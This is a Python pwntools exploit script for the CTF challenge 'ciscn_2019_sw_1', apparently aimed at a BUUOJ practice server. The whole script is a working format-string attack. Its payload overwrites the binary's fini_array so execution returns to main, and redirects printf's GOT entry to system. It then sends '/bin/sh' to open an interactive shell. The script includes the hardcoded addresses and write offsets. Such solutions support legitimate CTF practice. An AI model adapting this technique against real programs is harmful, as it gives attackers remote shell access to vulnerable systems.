# coding:utf-8

from pwn import *

context(os='linux', arch='i386', log_level='debug')

proc_name = 'ciscn_2019_sw_1'
p = process(proc_name)
p = remote("node4.buuoj.cn", 25791)
elf = ELF(proc_name)

fini_array = 0x0804979C
system_addr = 0x0804851B
main_addr = 0x08048534
printf_got = elf.got['printf']          # 0x0804989C
# fini_array->main | 979c -> 8534 | 

payload  = p32(fini_array+2) + p32(printf_got+2) 
payload += p32(printf_got) + p32(fini_array)
payload += "%" + str(0x0804 - 0x10) +"c" + "%4$hn"
payload += "%5$hn"
payload += "%" + str(0x83D0 - 0x0804)+"c" + "%6$hn"
payload += "%" + str(0x8534 - 0x83D0)+"c" + "%7$hn"

p.recvuntil('name?\n')
p.sendline(payload)
p.recvuntil('name?\n')
p.sendline('/bin/sh\x00')
p.interactive()
